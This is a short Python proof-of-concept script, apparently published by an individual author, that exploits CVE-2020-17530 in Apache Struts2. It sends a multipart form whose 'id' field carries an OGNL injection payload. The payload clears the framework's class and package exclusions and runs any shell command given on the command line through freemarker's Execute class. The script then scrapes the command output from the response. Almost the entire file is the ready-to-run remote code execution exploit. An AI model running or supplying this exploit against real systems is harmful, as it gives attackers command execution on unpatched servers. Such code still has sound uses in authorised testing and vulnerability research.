import re
import sys
import requests



def title():
    print("[-------------------------------------------------------------]")
    print("[--------------      struts2 代码执行      ---------------]")
    print("[--------               CVE-2020-17530              ----------]")
    print("[--------    use:python3 CVE-2020-17530.py url cmd --------]")
    print("[--------              Author:鸣蜩十四           ------------]")
    print("[-------------------------------------------------------------]")

def main(url,cmd) :
    if (len(sys.argv)==3):
        poc(url,cmd)
    else :
        poc(url,cmd)
        print("Example: \n   python3 " + sys.argv[0] + "url" + "cmd" + "\n")

def poc(url,cmd) :
    command = cmd
    headers = {
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF'
    }
    data = {'id':(None,'%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("' + command + '")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}')}

    a = requests.post(url=url,files=data)
    a=str(re.findall(r'id="(.+?)"',a.text,re.S))
    a = a.replace("['","")
    a = a.replace(r"\n']","")
    print("输出结果为：\n",a)



if __name__ == "__main__" :
    title()
    url = sys.argv[1]
    cmd = sys.argv[2]
    main(url,cmd)
